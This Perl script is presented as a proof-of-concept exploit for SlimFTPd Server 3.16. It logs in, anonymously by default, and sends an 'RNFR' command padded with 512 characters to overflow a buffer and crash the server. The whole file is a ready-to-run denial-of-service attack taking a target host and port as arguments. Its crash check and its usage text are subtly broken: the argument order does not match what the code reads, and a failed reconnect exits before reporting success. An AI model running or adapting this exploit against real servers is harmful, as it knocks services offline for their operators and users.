#!/usr/bin/perl

# --------------------------------------------------- #/
# 47slimftpd_bof.pl - PoC exploit for SlimFTPd Server #/
# version 3.16                                        #/
# bug found by ml-bugtraq@twilight-hall.net           #/
#                                                     #/
# coded by k0r0l from acolytez team                   #/
# visit http://acolytez.com for details               #/
# --------------------------------------------------- #/

use Net::FTP;

# geting data/
$host = @ARGV[0];
$port = @ARGV[1];
$debug = @ARGV[2];
$user = @ARGV[3];
$pass = @ARGV[4];

# ===========/

if (($host) && ($port)) {

        # make exploit string/
        $exploit_string = "RNFR ";
        $exploit_string .= "X"x512;
        #  ===================/

        print "Trying to connect to $host:$port\n";
        $sock = Net::FTP->new("$host",Port => $port, TimeOut => 30,
        Debug => $debug) or die "[-] Connection failed\n"; print
        "[+] Connect OK!\n";
        print "Logging...\n";
        if (!$user) {
                $user = "anonymous";
                $pass = "ftp@ftp.com";
        }
        $sock->login($user, $pass);
        $answer = $sock->message;
        print "Sending string...\n";
        $sock->quot($exploit_string);
        print "Server $host may be down. Checking...\n";
        $sock = Net::FTP->new("$host",Port => $port, TimeOut => 30,
        Debug => $debug) or die "[-] Connection failed\n"; if
        ($sock) {print "[-] Exploit failed.\n";} else {print "[+]
        Server crashed!\n";}


} else {
        print "SlimFTPd Server - PoC
        Exploit\nhttp://AcolyteZ.com\n\nUsing: $0 host port username
        password [debug: 1 or 0]\n\n";
}
